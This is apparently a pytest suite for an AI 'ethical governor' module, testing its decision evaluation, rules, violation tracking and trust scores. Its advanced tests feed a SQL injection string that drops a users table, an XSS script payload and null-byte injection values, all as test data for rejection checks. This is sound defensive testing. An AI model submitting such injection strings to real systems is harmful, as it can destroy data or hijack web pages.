import pytest
from unittest.mock import Mock, patch, MagicMock
import json
import time
from datetime import datetime, timedelta

# Import the module being tested
from app.ai_backend.genesis_ethical_governor import (
    GenesisEthicalGovernor,
    EthicalDecision,
    EthicalViolation,
    EthicalContext,
    DecisionResult
)


class TestGenesisEthicalGovernor:
    """Comprehensive test suite for GenesisEthicalGovernor class"""
    
    @pytest.fixture
    def governor(self):
        """Create a fresh GenesisEthicalGovernor instance for each test"""
        return GenesisEthicalGovernor()
    
    @pytest.fixture
    def mock_ethical_context(self):
        """Create a mock ethical context for testing"""
        return EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data={"test": "data"},
            timestamp=datetime.now()
        )
    
    def test_initialization(self, governor):
        """Test proper initialization of GenesisEthicalGovernor"""
        assert governor is not None
        assert hasattr(governor, 'ethical_rules')
        assert hasattr(governor, 'decision_history')
        assert hasattr(governor, 'violation_threshold')
        assert isinstance(governor.ethical_rules, list)
        assert isinstance(governor.decision_history, list)
    
    def test_initialization_with_custom_config(self):
        """Test initialization with custom configuration"""
        custom_config = {
            'violation_threshold': 5,
            'strict_mode': True,
            'logging_enabled': False
        }
        governor = GenesisEthicalGovernor(config=custom_config)
        assert governor.violation_threshold == 5
        assert governor.strict_mode is True
        assert governor.logging_enabled is False
    
    def test_evaluate_decision_valid_input(self, governor, mock_ethical_context):
        """Test decision evaluation with valid input"""
        decision = EthicalDecision(
            action="read_data",
            context=mock_ethical_context,
            parameters={"data_type": "public"}
        )
        
        result = governor.evaluate_decision(decision)
        
        assert isinstance(result, DecisionResult)
        assert result.approved in [True, False]
        assert isinstance(result.confidence_score, float)
        assert 0.0 <= result.confidence_score <= 1.0
        assert isinstance(result.reasoning, str)
    
    def test_evaluate_decision_invalid_input(self, governor):
        """Test decision evaluation with invalid input"""
        with pytest.raises(ValueError):
            governor.evaluate_decision(None)
        
        with pytest.raises(TypeError):
            governor.evaluate_decision("invalid_decision")
    
    def test_evaluate_decision_high_risk_action(self, governor, mock_ethical_context):
        """Test evaluation of high-risk actions"""
        high_risk_decision = EthicalDecision(
            action="delete_all_data",
            context=mock_ethical_context,
            parameters={"scope": "global"}
        )
        
        result = governor.evaluate_decision(high_risk_decision)
        
        assert result.approved is False
        assert result.confidence_score > 0.8
        assert "high risk" in result.reasoning.lower()
    
    def test_evaluate_decision_low_risk_action(self, governor, mock_ethical_context):
        """Test evaluation of low-risk actions"""
        low_risk_decision = EthicalDecision(
            action="read_public_data",
            context=mock_ethical_context,
            parameters={"data_type": "public", "scope": "limited"}
        )
        
        result = governor.evaluate_decision(low_risk_decision)
        
        assert result.approved is True
        assert result.confidence_score > 0.5
    
    def test_add_ethical_rule(self, governor):
        """Test adding new ethical rules"""
        initial_count = len(governor.ethical_rules)
        
        new_rule = {
            "name": "test_rule",
            "condition": lambda ctx: ctx.action == "forbidden_action",
            "action": "deny",
            "priority": 1
        }
        
        governor.add_ethical_rule(new_rule)
        
        assert len(governor.ethical_rules) == initial_count + 1
        assert governor.ethical_rules[-1]["name"] == "test_rule"
    
    def test_add_ethical_rule_invalid_input(self, governor):
        """Test adding invalid ethical rules"""
        with pytest.raises(ValueError):
            governor.add_ethical_rule(None)
        
        with pytest.raises(KeyError):
            governor.add_ethical_rule({"incomplete": "rule"})
    
    def test_remove_ethical_rule(self, governor):
        """Test removing ethical rules"""
        # Add a rule first
        test_rule = {
            "name": "removable_rule",
            "condition": lambda ctx: False,
            "action": "allow",
            "priority": 1
        }
        governor.add_ethical_rule(test_rule)
        initial_count = len(governor.ethical_rules)
        
        # Remove the rule
        governor.remove_ethical_rule("removable_rule")
        
        assert len(governor.ethical_rules) == initial_count - 1
        assert not any(rule["name"] == "removable_rule" for rule in governor.ethical_rules)
    
    def test_remove_nonexistent_rule(self, governor):
        """Test removing a rule that doesn't exist"""
        with pytest.raises(ValueError):
            governor.remove_ethical_rule("nonexistent_rule")
    
    def test_get_decision_history(self, governor, mock_ethical_context):
        """Test retrieving decision history"""
        decision = EthicalDecision(
            action="test_action",
            context=mock_ethical_context,
            parameters={}
        )
        
        # Make some decisions
        governor.evaluate_decision(decision)
        governor.evaluate_decision(decision)
        
        history = governor.get_decision_history()
        
        assert len(history) == 2
        assert all(isinstance(entry, dict) for entry in history)
        assert all("timestamp" in entry for entry in history)
        assert all("decision" in entry for entry in history)
        assert all("result" in entry for entry in history)
    
    def test_get_decision_history_filtered(self, governor, mock_ethical_context):
        """Test retrieving filtered decision history"""
        decision1 = EthicalDecision(
            action="action1",
            context=mock_ethical_context,
            parameters={}
        )
        decision2 = EthicalDecision(
            action="action2",
            context=mock_ethical_context,
            parameters={}
        )
        
        governor.evaluate_decision(decision1)
        governor.evaluate_decision(decision2)
        
        filtered_history = governor.get_decision_history(action_filter="action1")
        
        assert len(filtered_history) == 1
        assert filtered_history[0]["decision"].action == "action1"
    
    def test_clear_decision_history(self, governor, mock_ethical_context):
        """Test clearing decision history"""
        decision = EthicalDecision(
            action="test_action",
            context=mock_ethical_context,
            parameters={}
        )
        
        governor.evaluate_decision(decision)
        assert len(governor.decision_history) > 0
        
        governor.clear_decision_history()
        assert len(governor.decision_history) == 0
    
    def test_violation_tracking(self, governor, mock_ethical_context):
        """Test tracking of ethical violations"""
        violation = EthicalViolation(
            user_id="test_user",
            action="prohibited_action",
            context=mock_ethical_context,
            severity="high",
            timestamp=datetime.now()
        )
        
        governor.record_violation(violation)
        
        violations = governor.get_violations("test_user")
        assert len(violations) == 1
        assert violations[0].action == "prohibited_action"
        assert violations[0].severity == "high"
    
    def test_user_trust_score(self, governor, mock_ethical_context):
        """Test user trust score calculation"""
        initial_score = governor.get_user_trust_score("test_user")
        assert 0.0 <= initial_score <= 1.0
        
        # Record a violation
        violation = EthicalViolation(
            user_id="test_user",
            action="minor_violation",
            context=mock_ethical_context,
            severity="low",
            timestamp=datetime.now()
        )
        governor.record_violation(violation)
        
        new_score = governor.get_user_trust_score("test_user")
        assert new_score <= initial_score
    
    def test_user_trust_score_recovery(self, governor, mock_ethical_context):
        """Test user trust score recovery over time"""
        # Create an old violation
        old_violation = EthicalViolation(
            user_id="test_user",
            action="old_violation",
            context=mock_ethical_context,
            severity="medium",
            timestamp=datetime.now() - timedelta(days=30)
        )
        governor.record_violation(old_violation)
        
        # Trust score should be higher than with recent violation
        score_with_old_violation = governor.get_user_trust_score("test_user")
        
        # Create a recent violation
        recent_violation = EthicalViolation(
            user_id="test_user2",
            action="recent_violation",
            context=mock_ethical_context,
            severity="medium",
            timestamp=datetime.now()
        )
        governor.record_violation(recent_violation)
        
        score_with_recent_violation = governor.get_user_trust_score("test_user2")
        
        assert score_with_old_violation > score_with_recent_violation
    
    def test_ethical_context_validation(self, governor):
        """Test validation of ethical context"""
        # Valid context
        valid_context = EthicalContext(
            user_id="valid_user",
            action="valid_action",
            context_data={"key": "value"},
            timestamp=datetime.now()
        )
        
        assert governor.validate_context(valid_context) is True
        
        # Invalid context (missing required fields)
        invalid_context = EthicalContext(
            user_id="",
            action="",
            context_data=None,
            timestamp=None
        )
        
        assert governor.validate_context(invalid_context) is False
    
    def test_concurrent_decision_evaluation(self, governor, mock_ethical_context):
        """Test concurrent decision evaluation"""
        import threading
        
        decisions = []
        results = []
        
        def make_decision(decision_id):
            decision = EthicalDecision(
                action=f"concurrent_action_{decision_id}",
                context=mock_ethical_context,
                parameters={"decision_id": decision_id}
            )
            result = governor.evaluate_decision(decision)
            results.append(result)
        
        # Create multiple threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=make_decision, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        assert len(results) == 10
        assert all(isinstance(result, DecisionResult) for result in results)
    
    def test_performance_with_large_history(self, governor, mock_ethical_context):
        """Test performance with large decision history"""
        start_time = time.time()
        
        # Create a large number of decisions
        for i in range(1000):
            decision = EthicalDecision(
                action=f"bulk_action_{i}",
                context=mock_ethical_context,
                parameters={"index": i}
            )
            governor.evaluate_decision(decision)
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # Should complete within reasonable time (adjust threshold as needed)
        assert execution_time < 10.0  # 10 seconds
        assert len(governor.decision_history) == 1000
    
    def test_serialization(self, governor, mock_ethical_context):
        """Test serialization and deserialization of governor state"""
        # Make some decisions to create state
        decision = EthicalDecision(
            action="serialization_test",
            context=mock_ethical_context,
            parameters={}
        )
        governor.evaluate_decision(decision)
        
        # Serialize state
        serialized_state = governor.serialize_state()
        assert isinstance(serialized_state, str)
        
        # Create new governor and deserialize
        new_governor = GenesisEthicalGovernor()
        new_governor.deserialize_state(serialized_state)
        
        # Verify state was restored
        assert len(new_governor.decision_history) == len(governor.decision_history)
        assert new_governor.violation_threshold == governor.violation_threshold
    
    def test_edge_case_empty_parameters(self, governor, mock_ethical_context):
        """Test handling of decisions with empty parameters"""
        decision = EthicalDecision(
            action="empty_params_action",
            context=mock_ethical_context,
            parameters={}
        )
        
        result = governor.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_edge_case_none_parameters(self, governor, mock_ethical_context):
        """Test handling of decisions with None parameters"""
        decision = EthicalDecision(
            action="none_params_action",
            context=mock_ethical_context,
            parameters=None
        )
        
        result = governor.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_edge_case_very_long_action_name(self, governor, mock_ethical_context):
        """Test handling of very long action names"""
        long_action = "a" * 1000
        decision = EthicalDecision(
            action=long_action,
            context=mock_ethical_context,
            parameters={}
        )
        
        result = governor.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_memory_usage_with_large_context(self, governor):
        """Test memory usage with large context data"""
        large_context_data = {"data": "x" * 10000}  # 10KB of data
        
        context = EthicalContext(
            user_id="memory_test_user",
            action="memory_test_action",
            context_data=large_context_data,
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="memory_test",
            context=context,
            parameters={}
        )
        
        result = governor.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    @patch('app.ai_backend.genesis_ethical_governor.logging')
    def test_logging_functionality(self, mock_logging, governor, mock_ethical_context):
        """Test logging functionality"""
        decision = EthicalDecision(
            action="logged_action",
            context=mock_ethical_context,
            parameters={}
        )
        
        governor.evaluate_decision(decision)
        
        # Verify logging was called
        mock_logging.info.assert_called()
    
    def test_custom_rule_priority(self, governor, mock_ethical_context):
        """Test that custom rules are evaluated in priority order"""
        # Add high priority rule
        high_priority_rule = {
            "name": "high_priority",
            "condition": lambda ctx: ctx.action == "priority_test",
            "action": "deny",
            "priority": 10
        }
        
        # Add low priority rule
        low_priority_rule = {
            "name": "low_priority",
            "condition": lambda ctx: ctx.action == "priority_test",
            "action": "allow",
            "priority": 1
        }
        
        governor.add_ethical_rule(low_priority_rule)
        governor.add_ethical_rule(high_priority_rule)
        
        decision = EthicalDecision(
            action="priority_test",
            context=mock_ethical_context,
            parameters={}
        )
        
        result = governor.evaluate_decision(decision)
        
        # High priority rule should win (deny)
        assert result.approved is False
    
    def test_configuration_validation(self):
        """Test configuration validation"""
        # Valid configuration
        valid_config = {
            'violation_threshold': 3,
            'strict_mode': False,
            'logging_enabled': True
        }
        governor = GenesisEthicalGovernor(config=valid_config)
        assert governor.violation_threshold == 3
        
        # Invalid configuration
        with pytest.raises(ValueError):
            invalid_config = {
                'violation_threshold': -1,  # Invalid negative threshold
                'strict_mode': "not_boolean",  # Invalid type
                'logging_enabled': True
            }
            GenesisEthicalGovernor(config=invalid_config)


class TestEthicalDecision:
    """Test cases for EthicalDecision class"""
    
    def test_ethical_decision_creation(self):
        """Test creation of EthicalDecision objects"""
        context = EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data={},
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="test_action",
            context=context,
            parameters={"param1": "value1"}
        )
        
        assert decision.action == "test_action"
        assert decision.context == context
        assert decision.parameters == {"param1": "value1"}
    
    def test_ethical_decision_equality(self):
        """Test equality comparison of EthicalDecision objects"""
        context = EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data={},
            timestamp=datetime.now()
        )
        
        decision1 = EthicalDecision(
            action="test_action",
            context=context,
            parameters={"param1": "value1"}
        )
        
        decision2 = EthicalDecision(
            action="test_action",
            context=context,
            parameters={"param1": "value1"}
        )
        
        assert decision1 == decision2
    
    def test_ethical_decision_string_representation(self):
        """Test string representation of EthicalDecision"""
        context = EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data={},
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="test_action",
            context=context,
            parameters={}
        )
        
        str_repr = str(decision)
        assert "test_action" in str_repr
        assert "EthicalDecision" in str_repr


class TestEthicalViolation:
    """Test cases for EthicalViolation class"""
    
    def test_ethical_violation_creation(self):
        """Test creation of EthicalViolation objects"""
        context = EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data={},
            timestamp=datetime.now()
        )
        
        violation = EthicalViolation(
            user_id="test_user",
            action="prohibited_action",
            context=context,
            severity="high",
            timestamp=datetime.now()
        )
        
        assert violation.user_id == "test_user"
        assert violation.action == "prohibited_action"
        assert violation.context == context
        assert violation.severity == "high"
        assert isinstance(violation.timestamp, datetime)
    
    def test_ethical_violation_severity_validation(self):
        """Test validation of severity levels"""
        context = EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data={},
            timestamp=datetime.now()
        )
        
        # Valid severities
        valid_severities = ["low", "medium", "high", "critical"]
        for severity in valid_severities:
            violation = EthicalViolation(
                user_id="test_user",
                action="test_action",
                context=context,
                severity=severity,
                timestamp=datetime.now()
            )
            assert violation.severity == severity
        
        # Invalid severity
        with pytest.raises(ValueError):
            EthicalViolation(
                user_id="test_user",
                action="test_action",
                context=context,
                severity="invalid_severity",
                timestamp=datetime.now()
            )


class TestEthicalContext:
    """Test cases for EthicalContext class"""
    
    def test_ethical_context_creation(self):
        """Test creation of EthicalContext objects"""
        context = EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data={"key": "value"},
            timestamp=datetime.now()
        )
        
        assert context.user_id == "test_user"
        assert context.action == "test_action"
        assert context.context_data == {"key": "value"}
        assert isinstance(context.timestamp, datetime)
    
    def test_ethical_context_with_none_data(self):
        """Test EthicalContext with None context_data"""
        context = EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data=None,
            timestamp=datetime.now()
        )
        
        assert context.context_data is None
    
    def test_ethical_context_serialization(self):
        """Test serialization of EthicalContext"""
        context = EthicalContext(
            user_id="test_user",
            action="test_action",
            context_data={"key": "value"},
            timestamp=datetime.now()
        )
        
        serialized = context.to_dict()
        assert isinstance(serialized, dict)
        assert serialized["user_id"] == "test_user"
        assert serialized["action"] == "test_action"
        assert serialized["context_data"] == {"key": "value"}


class TestDecisionResult:
    """Test cases for DecisionResult class"""
    
    def test_decision_result_creation(self):
        """Test creation of DecisionResult objects"""
        result = DecisionResult(
            approved=True,
            confidence_score=0.95,
            reasoning="Action approved based on user trust score",
            metadata={"rule_applied": "trust_check"}
        )
        
        assert result.approved is True
        assert result.confidence_score == 0.95
        assert result.reasoning == "Action approved based on user trust score"
        assert result.metadata == {"rule_applied": "trust_check"}
    
    def test_decision_result_confidence_score_validation(self):
        """Test validation of confidence score range"""
        # Valid confidence scores
        valid_scores = [0.0, 0.5, 1.0]
        for score in valid_scores:
            result = DecisionResult(
                approved=True,
                confidence_score=score,
                reasoning="Test reasoning"
            )
            assert result.confidence_score == score
        
        # Invalid confidence scores
        invalid_scores = [-0.1, 1.1, 2.0]
        for score in invalid_scores:
            with pytest.raises(ValueError):
                DecisionResult(
                    approved=True,
                    confidence_score=score,
                    reasoning="Test reasoning"
                )
    
    def test_decision_result_string_representation(self):
        """Test string representation of DecisionResult"""
        result = DecisionResult(
            approved=True,
            confidence_score=0.95,
            reasoning="Test reasoning"
        )
        
        str_repr = str(result)
        assert "approved=True" in str_repr
        assert "confidence_score=0.95" in str_repr
        assert "DecisionResult" in str_repr


# Integration tests
class TestGenesisEthicalGovernorIntegration:
    """Integration tests for GenesisEthicalGovernor"""
    
    def test_full_workflow(self):
        """Test complete workflow from decision to violation tracking"""
        governor = GenesisEthicalGovernor()
        
        # Create context
        context = EthicalContext(
            user_id="integration_user",
            action="risky_action",
            context_data={"risk_level": "high"},
            timestamp=datetime.now()
        )
        
        # Create decision
        decision = EthicalDecision(
            action="risky_action",
            context=context,
            parameters={"force": True}
        )
        
        # Evaluate decision
        result = governor.evaluate_decision(decision)
        
        # If rejected, record violation
        if not result.approved:
            violation = EthicalViolation(
                user_id="integration_user",
                action="risky_action",
                context=context,
                severity="high",
                timestamp=datetime.now()
            )
            governor.record_violation(violation)
        
        # Check user trust score
        trust_score = governor.get_user_trust_score("integration_user")
        assert isinstance(trust_score, float)
        assert 0.0 <= trust_score <= 1.0
        
        # Verify decision history
        history = governor.get_decision_history()
        assert len(history) >= 1
    
    def test_bulk_decision_processing(self):
        """Test processing multiple decisions in bulk"""
        governor = GenesisEthicalGovernor()
        
        decisions = []
        for i in range(100):
            context = EthicalContext(
                user_id=f"bulk_user_{i % 10}",
                action=f"bulk_action_{i}",
                context_data={"batch_id": i},
                timestamp=datetime.now()
            )
            
            decision = EthicalDecision(
                action=f"bulk_action_{i}",
                context=context,
                parameters={"batch_processing": True}
            )
            decisions.append(decision)
        
        # Process all decisions
        results = []
        for decision in decisions:
            result = governor.evaluate_decision(decision)
            results.append(result)
        
        assert len(results) == 100
        assert all(isinstance(result, DecisionResult) for result in results)
        assert len(governor.decision_history) == 100

# Additional comprehensive tests for enhanced coverage

class TestGenesisEthicalGovernorAdvanced:
    """Advanced test cases for GenesisEthicalGovernor covering edge cases and security"""
    
    @pytest.fixture
    def governor_with_config(self):
        """Governor with comprehensive configuration"""
        config = {
            'violation_threshold': 3,
            'strict_mode': True,
            'logging_enabled': True,
            'rate_limiting_enabled': True,
            'cache_size': 1000,
            'max_context_size': 10000
        }
        return GenesisEthicalGovernor(config=config)
    
    @pytest.fixture
    def malicious_context(self):
        """Context with potentially malicious data"""
        return EthicalContext(
            user_id="malicious_user",
            action="sql_injection_attempt",
            context_data={
                "query": "'; DROP TABLE users; --",
                "payload": "<script>alert('xss')</script>",
                "oversized_data": "A" * 50000
            },
            timestamp=datetime.now()
        )
    
    def test_sql_injection_detection(self, governor_with_config, malicious_context):
        """Test detection of SQL injection attempts"""
        decision = EthicalDecision(
            action="database_query",
            context=malicious_context,
            parameters={"query": "'; DROP TABLE users; --"}
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert result.approved is False
        assert result.confidence_score > 0.9
        assert "sql injection" in result.reasoning.lower() or "malicious" in result.reasoning.lower()
    
    def test_xss_detection(self, governor_with_config, malicious_context):
        """Test detection of XSS attempts"""
        decision = EthicalDecision(
            action="user_input_processing",
            context=malicious_context,
            parameters={"user_input": "<script>alert('xss')</script>"}
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert result.approved is False
        assert result.confidence_score > 0.8
    
    def test_oversized_data_handling(self, governor_with_config, malicious_context):
        """Test handling of oversized data payloads"""
        decision = EthicalDecision(
            action="data_processing",
            context=malicious_context,
            parameters={"data": "X" * 100000}  # 100KB
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
        # Should handle gracefully without crashing
    
    def test_unicode_handling(self, governor_with_config):
        """Test handling of Unicode and special characters"""
        unicode_context = EthicalContext(
            user_id="unicode_user_🚀",
            action="unicode_action_测试",
            context_data={"message": "Hello 世界! 🌍 Здравствуй мир!"},
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="unicode_test",
            context=unicode_context,
            parameters={"unicode_param": "emoji_test_🎉"}
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_rate_limiting_behavior(self, governor_with_config):
        """Test rate limiting functionality"""
        context = EthicalContext(
            user_id="rate_limited_user",
            action="rapid_fire_action",
            context_data={},
            timestamp=datetime.now()
        )
        
        decisions = []
        results = []
        
        # Rapid fire decisions
        for i in range(50):
            decision = EthicalDecision(
                action=f"rapid_action_{i}",
                context=context,
                parameters={"request_id": i}
            )
            decisions.append(decision)
        
        # Process rapidly
        for decision in decisions:
            result = governor_with_config.evaluate_decision(decision)
            results.append(result)
        
        # Should handle all requests without crashing
        assert len(results) == 50
        assert all(isinstance(result, DecisionResult) for result in results)
    
    def test_memory_leak_prevention(self, governor_with_config):
        """Test memory leak prevention with large datasets"""
        import gc
        
        # Get initial memory usage
        gc.collect()
        
        # Create many decisions with large contexts
        for i in range(100):
            large_context = EthicalContext(
                user_id=f"memory_user_{i}",
                action=f"memory_action_{i}",
                context_data={"large_data": "X" * 1000},  # 1KB each
                timestamp=datetime.now()
            )
            
            decision = EthicalDecision(
                action=f"memory_test_{i}",
                context=large_context,
                parameters={"index": i}
            )
            
            result = governor_with_config.evaluate_decision(decision)
            assert isinstance(result, DecisionResult)
            
            # Trigger garbage collection periodically
            if i % 10 == 0:
                gc.collect()
        
        # Final garbage collection
        gc.collect()
        
        # Should not crash or exhaust memory
        assert len(governor_with_config.decision_history) == 100
    
    def test_circular_reference_handling(self, governor_with_config):
        """Test handling of circular references in context data"""
        circular_data = {}
        circular_data["self"] = circular_data
        
        context = EthicalContext(
            user_id="circular_user",
            action="circular_test",
            context_data=circular_data,
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="circular_reference_test",
            context=context,
            parameters={}
        )
        
        # Should handle gracefully without infinite recursion
        result = governor_with_config.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_deeply_nested_data(self, governor_with_config):
        """Test handling of deeply nested data structures"""
        # Create deeply nested structure
        nested_data = {}
        current = nested_data
        for i in range(100):
            current["level"] = i
            current["next"] = {}
            current = current["next"]
        
        context = EthicalContext(
            user_id="nested_user",
            action="nested_test",
            context_data=nested_data,
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="nested_data_test",
            context=context,
            parameters={}
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_concurrent_rule_modification(self, governor_with_config):
        """Test concurrent rule addition and removal"""
        import threading
        import time
        
        def add_rules():
            for i in range(10):
                rule = {
                    "name": f"concurrent_rule_{i}",
                    "condition": lambda ctx: ctx.action == f"concurrent_action_{i}",
                    "action": "allow",
                    "priority": i
                }
                governor_with_config.add_ethical_rule(rule)
                time.sleep(0.001)  # Small delay
        
        def remove_rules():
            time.sleep(0.005)  # Let some rules be added first
            for i in range(5):
                try:
                    governor_with_config.remove_ethical_rule(f"concurrent_rule_{i}")
                except ValueError:
                    pass  # Rule might not exist yet
                time.sleep(0.001)
        
        def make_decisions():
            for i in range(20):
                context = EthicalContext(
                    user_id=f"concurrent_user_{i}",
                    action=f"concurrent_action_{i % 10}",
                    context_data={},
                    timestamp=datetime.now()
                )
                
                decision = EthicalDecision(
                    action=f"concurrent_action_{i % 10}",
                    context=context,
                    parameters={}
                )
                
                result = governor_with_config.evaluate_decision(decision)
                assert isinstance(result, DecisionResult)
                time.sleep(0.001)
        
        # Start concurrent operations
        threads = [
            threading.Thread(target=add_rules),
            threading.Thread(target=remove_rules),
            threading.Thread(target=make_decisions)
        ]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should complete without deadlock or crashes
        assert True  # If we reach here, test passed
    
    def test_invalid_timestamp_handling(self, governor_with_config):
        """Test handling of invalid timestamps"""
        # Future timestamp
        future_context = EthicalContext(
            user_id="future_user",
            action="future_action",
            context_data={},
            timestamp=datetime.now() + timedelta(days=365)
        )
        
        decision = EthicalDecision(
            action="future_test",
            context=future_context,
            parameters={}
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
        
        # Very old timestamp
        old_context = EthicalContext(
            user_id="old_user",
            action="old_action",
            context_data={},
            timestamp=datetime(1970, 1, 1)
        )
        
        decision = EthicalDecision(
            action="old_test",
            context=old_context,
            parameters={}
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_extreme_confidence_scores(self, governor_with_config):
        """Test handling of extreme confidence score calculations"""
        # Test with context that should generate extreme scores
        high_confidence_context = EthicalContext(
            user_id="trusted_admin",
            action="admin_action",
            context_data={"admin_level": "supreme"},
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="admin_action",
            context=high_confidence_context,
            parameters={"admin_override": True}
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert 0.0 <= result.confidence_score <= 1.0
    
    def test_null_byte_injection(self, governor_with_config):
        """Test handling of null byte injection attempts"""
        null_context = EthicalContext(
            user_id="null_user\x00admin",
            action="null_action\x00bypass",
            context_data={"payload": "normal\x00malicious"},
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="null_test",
            context=null_context,
            parameters={"null_param": "test\x00injection"}
        )
        
        result = governor_with_config.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_decision_caching_behavior(self, governor_with_config):
        """Test decision caching and consistency"""
        context = EthicalContext(
            user_id="cache_user",
            action="cacheable_action",
            context_data={"cache_key": "test"},
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="cacheable_action",
            context=context,
            parameters={"consistent": True}
        )
        
        # Make same decision multiple times
        results = []
        for _ in range(5):
            result = governor_with_config.evaluate_decision(decision)
            results.append(result)
        
        # Results should be consistent
        assert all(result.approved == results[0].approved for result in results)
    
    def test_context_mutation_safety(self, governor_with_config):
        """Test that context objects are not mutated during evaluation"""
        original_data = {"mutable": "original"}
        context = EthicalContext(
            user_id="mutation_user",
            action="mutation_test",
            context_data=original_data,
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="mutation_test",
            context=context,
            parameters={"param": "value"}
        )
        
        # Evaluate decision
        result = governor_with_config.evaluate_decision(decision)
        
        # Original data should not be mutated
        assert original_data["mutable"] == "original"
        assert context.context_data["mutable"] == "original"
    
    def test_violation_severity_escalation(self, governor_with_config):
        """Test escalation of violation severity based on frequency"""
        user_id = "escalation_user"
        
        # Record multiple violations
        for i in range(5):
            violation = EthicalViolation(
                user_id=user_id,
                action=f"violation_action_{i}",
                context=EthicalContext(
                    user_id=user_id,
                    action=f"violation_action_{i}",
                    context_data={},
                    timestamp=datetime.now()
                ),
                severity="low",
                timestamp=datetime.now()
            )
            governor_with_config.record_violation(violation)
        
        # Trust score should decrease significantly
        trust_score = governor_with_config.get_user_trust_score(user_id)
        assert trust_score < 0.5  # Should be significantly reduced
    
    def test_rule_condition_exception_handling(self, governor_with_config):
        """Test handling of exceptions in rule conditions"""
        def failing_condition(ctx):
            raise Exception("Rule condition failed")
        
        # Add rule with failing condition
        failing_rule = {
            "name": "failing_rule",
            "condition": failing_condition,
            "action": "deny",
            "priority": 1
        }
        
        governor_with_config.add_ethical_rule(failing_rule)
        
        context = EthicalContext(
            user_id="exception_user",
            action="exception_test",
            context_data={},
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="exception_test",
            context=context,
            parameters={}
        )
        
        # Should handle exception gracefully
        result = governor_with_config.evaluate_decision(decision)
        assert isinstance(result, DecisionResult)
    
    def test_serialization_edge_cases(self, governor_with_config):
        """Test serialization with edge cases"""
        # Add complex state
        complex_rule = {
            "name": "complex_rule",
            "condition": lambda ctx: True,
            "action": "allow",
            "priority": 1,
            "metadata": {"complex": {"nested": "data"}}
        }
        governor_with_config.add_ethical_rule(complex_rule)
        
        # Make decision to add to history
        context = EthicalContext(
            user_id="serialization_user",
            action="serialization_test",
            context_data={"complex": "data"},
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="serialization_test",
            context=context,
            parameters={}
        )
        
        governor_with_config.evaluate_decision(decision)
        
        # Test serialization
        serialized = governor_with_config.serialize_state()
        assert isinstance(serialized, str)
        assert len(serialized) > 0
        
        # Test deserialization
        new_governor = GenesisEthicalGovernor()
        new_governor.deserialize_state(serialized)
        
        # Verify state
        assert len(new_governor.decision_history) > 0


class TestGenesisEthicalGovernorStressTests:
    """Stress tests for GenesisEthicalGovernor"""
    
    def test_massive_concurrent_load(self):
        """Test handling of massive concurrent load"""
        import threading
        import time
        
        governor = GenesisEthicalGovernor()
        results = []
        errors = []
        
        def worker(worker_id):
            try:
                for i in range(100):
                    context = EthicalContext(
                        user_id=f"stress_user_{worker_id}",
                        action=f"stress_action_{i}",
                        context_data={"worker_id": worker_id, "iteration": i},
                        timestamp=datetime.now()
                    )
                    
                    decision = EthicalDecision(
                        action=f"stress_action_{i}",
                        context=context,
                        parameters={"stress_test": True}
                    )
                    
                    result = governor.evaluate_decision(decision)
                    results.append(result)
            except Exception as e:
                errors.append(e)
        
        # Create many worker threads
        threads = []
        for i in range(20):
            thread = threading.Thread(target=worker, args=(i,))
            threads.append(thread)
        
        # Start all threads
        start_time = time.time()
        for thread in threads:
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        
        # Verify results
        assert len(errors) == 0, f"Errors occurred: {errors}"
        assert len(results) == 2000  # 20 workers * 100 iterations
        assert all(isinstance(result, DecisionResult) for result in results)
        
        # Performance check (should complete within reasonable time)
        execution_time = end_time - start_time
        assert execution_time < 30.0  # Should complete within 30 seconds
    
    def test_memory_pressure_handling(self):
        """Test behavior under memory pressure"""
        governor = GenesisEthicalGovernor()
        
        # Create decisions with increasingly large context data
        for i in range(50):
            large_data = {"payload": "X" * (1000 * i)}  # Increasing size
            
            context = EthicalContext(
                user_id=f"memory_pressure_user_{i}",
                action=f"memory_pressure_action_{i}",
                context_data=large_data,
                timestamp=datetime.now()
            )
            
            decision = EthicalDecision(
                action=f"memory_pressure_action_{i}",
                context=context,
                parameters={"size": 1000 * i}
            )
            
            result = governor.evaluate_decision(decision)
